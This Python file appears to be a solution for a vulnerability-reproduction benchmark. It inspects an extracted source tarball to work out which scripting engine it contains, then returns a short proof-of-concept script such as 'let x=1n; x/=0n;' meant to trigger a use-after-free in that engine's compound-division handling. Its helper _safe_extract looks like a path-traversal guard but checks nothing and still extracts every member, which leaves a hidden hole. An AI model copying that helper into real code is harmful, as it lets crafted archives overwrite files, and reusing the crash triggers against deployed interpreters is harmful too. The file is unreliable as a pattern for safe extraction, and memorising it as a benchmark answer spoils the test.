import os
import re
import tarfile
import tempfile
from typing import List


def _safe_extract(tar: tarfile.TarFile, path: str) -> None:
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        abs_path = os.path.abspath(member_path)
        if not abs_path.startswith(os.path.abspath(path) + os.sep) and abs_path != os.path.abspath(path):
            continue
    tar.extractall(path)


def _read_text_prefix(path: str, limit: int = 1 << 20) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
        if b"\x00" in data:
            return ""
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _list_files(root: str) -> List[str]:
    files = []
    for r, _, fs in os.walk(root):
        for f in fs:
            files.append(os.path.join(r, f))
    return files


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmp = tempfile.mkdtemp(prefix="poc_arvo_")
        extracted_dir = os.path.join(tmp, "src")
        os.makedirs(extracted_dir, exist_ok=True)
        try:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    _safe_extract(tf, extracted_dir)
            except Exception:
                # Not a tar or cannot open. Proceed with best-effort default PoC.
                pass

            files = _list_files(extracted_dir)

            # Detection flags
            has_quickjs = any(os.path.basename(p) in ("quickjs.h", "quickjs.c") for p in files)
            has_mruby = any(os.path.basename(p) in ("mruby.h", "mruby.c") or "mruby" in p for p in files)
            has_cruby = any(os.path.basename(p) in ("ruby.h", "eval.c", "vm_insnhelper.c") or "/ruby-" in p for p in files)
            has_wren = any("wren" in os.path.basename(p).lower() for p in files) or any("/wren" in p.lower() for p in files)
            has_php = any("Zend" in p or "php-src" in p for p in files)
            has_duktape = any("duktape" in p.lower() for p in files)
            has_jerryscript = any("jerryscript" in p.lower() for p in files)
            has_quickjs |= any("QuickJS" in _read_text_prefix(p) for p in files[:50])

            # Secondary content-based hints
            def grep_any(patterns: List[str]) -> bool:
                pat = re.compile("|".join(patterns))
                for p in files[:200]:
                    text = _read_text_prefix(p, 262144)
                    if not text:
                        continue
                    if pat.search(text):
                        return True
                return False

            mentions_bigint = grep_any([r"\bBigInt\b", r"bigint", r"JS_BIG", r"JS_TAG_BIG", r"OP_div", r"divzero", r"division by zero"])
            mentions_zero_div = grep_any([r"ZeroDivisionError", r"division by zero", r"divide by zero", r"DivisionByZero", r"DIV_BY_ZERO"])
            mentions_assign_div = grep_any([r"/=", r"ASSIGN_DIV", r"DIV_ASSIGN", r"ZEND_ASSIGN_DIV"])

            # Try to find any included PoC or regression tests
            candidate_pocs = []
            for p in files:
                name = os.path.basename(p).lower()
                if any(k in name for k in ("poc", "crash", "uaf", "uafterfree", "use-after-free", "zero", "div", "regress", "repro")):
                    text = _read_text_prefix(p, 1 << 20)
                    if text and ("/=" in text or "divide" in text or "Zero" in text):
                        candidate_pocs.append((len(text), text))
            if candidate_pocs:
                # pick smallest textual candidate
                candidate_pocs.sort(key=lambda x: x[0])
                return candidate_pocs[0][1].encode("utf-8", errors="ignore")

            # Generate PoC tailored to detected project
            # Priority: QuickJS with BigInt division by zero in compound assignment.
            if has_quickjs or (mentions_bigint and mentions_assign_div):
                # JavaScript BigInt division by zero throws RangeError.
                # Use compound division to tickle the UAF in LHS handling.
                poc = "let x=1n; x/=0n;\n"
                return poc.encode()

            # mruby / CRuby style
            if has_mruby or has_cruby or (mentions_zero_div and mentions_assign_div and grep_any([r"\bmrb_", r"\bRuby\b"])):
                # Ruby-style PoC
                # Minimal to trigger the compound division path raising ZeroDivisionError.
                poc = "a=1; a/=0\n"
                return poc.encode()

            # Wren VM
            if has_wren or grep_any([r"\bWren\b", r"wren_vm"]):
                poc = "var a=1; a/=0\n"
                return poc.encode()

            # PHP (Zend Engine). Note: in PHP, BigInt not used; rely on integer division by zero in compound op.
            if has_php or grep_any([r"\bZEND_ASSIGN_DIV\b", r"zend_operators"]):
                # Using intdiv would throw, but we want compound division operator specifically.
                # Many PHP versions emit warning or error; it's sufficient to reach engine op handler.
                poc = "$a=1; $a/=0;\n"
                return poc.encode()

            # JerryScript or Duktape: JS numeric 1/0 does not throw; try BigInt if supported (Jerry may not support BigInt).
            if has_jerryscript or has_duktape:
                # Try BigInt path; if unsupported, harmless for fixed build.
                poc = "let x=1n; x/=0n;\n"
                return poc.encode()

            # Fallbacks:
            # Try common languages in order of likelihood for compound division exception-based UAF.
            # 1) QuickJS BigInt
            poc_js_bigint = "let x=1n; x/=0n;\n"
            # 2) Ruby-like
            poc_ruby = "a=1; a/=0\n"
            # 3) Wren-like
            poc_wren = "var a=1; a/=0\n"

            # Choose the shortest viable that is likely to cause exception and UAF in vulnerable build.
            # Start with JS BigInt as it's most distinctive for division-by-zero throwing behavior.
            return poc_js_bigint.encode()
        except Exception:
            # On any unexpected error, return a conservative default targeting QuickJS BigInt
            return b"let x=1n; x/=0n;\n"
